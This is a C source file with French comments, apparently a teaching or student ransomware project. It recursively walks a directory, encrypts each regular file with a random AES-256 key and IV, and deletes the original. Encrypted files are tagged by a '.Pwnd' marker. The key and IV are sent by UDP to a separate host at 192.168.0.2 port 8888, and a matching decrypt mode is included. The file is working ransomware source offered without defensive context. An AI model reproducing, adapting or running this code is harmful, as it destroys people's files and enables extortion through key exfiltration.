#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/rand.h>



void usage(char *de_flag, int argc);

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char *de_flag, char *dkey, char *div);

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);

int send_key(char *pKey, char *pIv);

int main (int argc, char * argv[])
{

	// pour la fonction generate key
	int sizeKey = AES_256_KEY_SIZE;
        int sizeIv = AES_BLOCK_SIZE;
        unsigned char key[AES_256_KEY_SIZE];
        unsigned char iv[AES_BLOCK_SIZE];
        char *pkey = (char*)malloc(sizeof(key)*2+1);
        char *pIv = (char*)malloc(sizeof(iv)*2+1);
	const char *name = argv[1];
	char *de_flag =argv[2];
	char *dkey = argv[3];
	char *div = argv[4];
	generate_key(key, sizeKey, iv, sizeIv, pkey, pIv);
	listdir(name,pIv,pkey,de_flag,dkey,div);
	send_key(pkey,pIv);


}

void usage(char *de_flag,int argc)
{
	if(strcmp(de_flag,"chiffre")==0)
	{
		if(argc != 2)
		{
			printf("Si vous desirer chiffrer les fichiers, il faut indiquer comme premier argument,votre répertoire à chiffrer \n");
			printf("et aussi comme deuxième argument Si vous souhaitez chiffrer");
			return;
		}
	}
	if(strcmp(de_flag,"dechiffre")==0)
	{
		if(argc != 4)
		{
			printf("erreur vous devez indiquer l'un à la suite de l'autre, le répertoire, chiffrement ou non, la clé et l'iv recupérer\n");
			return;
		}
	}
}
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
        printf("In function ***\n");
        RAND_bytes(key,sizeKey);
        RAND_bytes(iv,sizeIv);

        printf("start\n");
        bytes_to_hexa(key,pKey,sizeKey);
        bytes_to_hexa(iv,pIv,sizeIv);

	printf("Print de la clé et du iv\n");
        printf("%s\n",pKey);
        printf("%s\n",pIv);
}

int send_key(char *pKey, char *pIv)
{
	//Connection en UDP utilisé
	int sockid;
	sockid = socket(AF_INET,SOCK_DGRAM,0);

	struct sockaddr_in server_addr;
	server_addr.sin_family= AF_INET;
	server_addr.sin_port = htons(8888);
	server_addr.sin_addr.s_addr =inet_addr("192.168.0.2");

	unsigned char *Hexakey =pKey;
	unsigned char *HexaIv =pIv;

	//envoie de la clé et du iv, les deux sont collés dans l'envoie
	sendto(sockid,(unsigned char *)Hexakey,strlen(Hexakey),0,(const struct sockaddr *) &server_addr,sizeof(server_addr));
        sendto(sockid,(unsigned char *)HexaIv,strlen(HexaIv),0,(const struct sockaddr *) &server_addr,sizeof(server_addr));
        close(sockid);


}
int is_encrypted(char *filename)
{
		if (strstr(filename,".Pwnd")==0)
			return 0;
		else
			return 1;
}
void listdir(const char *name, unsigned char *iv, unsigned char *key, char *de_flag, char *dkey, char *div)
{
	DIR* rep = opendir(name);
	if(rep == NULL)
	{
		perror("Unable to open the file");
		return;
	}

	struct dirent* repository;
	repository = readdir(rep);
	while (repository != NULL)
	{
		if(strcmp(repository->d_name,".")!=0 && strcmp(repository->d_name,"..")!=0)
		{
			if(is_encrypted(repository->d_name)==0 && repository->d_type == DT_REG)
			{
				if(strcmp(de_flag,"chiffre")==0)
				{
					char file[2048] = { 0 };
					strcat(file,name);
					strcat(file,"/");
					strcat(file,repository->d_name);
					encrypt(key,iv,file);
					remove(file);
				}
			}
			if(is_encrypted(repository->d_name)==1 && repository->d_type == DT_REG)
			{
				if(strcmp(de_flag,"dechiffre")==0)
				{
					char cipher_file[2048]= { 0 };
					strcat(cipher_file,name);
					strcat(cipher_file,"/");
					strcat(cipher_file,repository->d_name);
					decrypt(dkey,div,cipher_file);
					remove(cipher_file);
				}
			}
		}
		printf("%s\n", repository->d_name);
		if (repository->d_type == DT_DIR && strcmp(repository->d_name,".") != 0 && strcmp(repository->d_name,"..")!=0)
		{
			char path[2048] = { 0 };
			strcat(path,name);
			strcat(path,"/");
			strcat(path, repository->d_name);
			//printf("%s\n",path);
			listdir(path,iv,key,de_flag,dkey,div);
		}
		repository = readdir(rep);
	}
	closedir(rep);
}

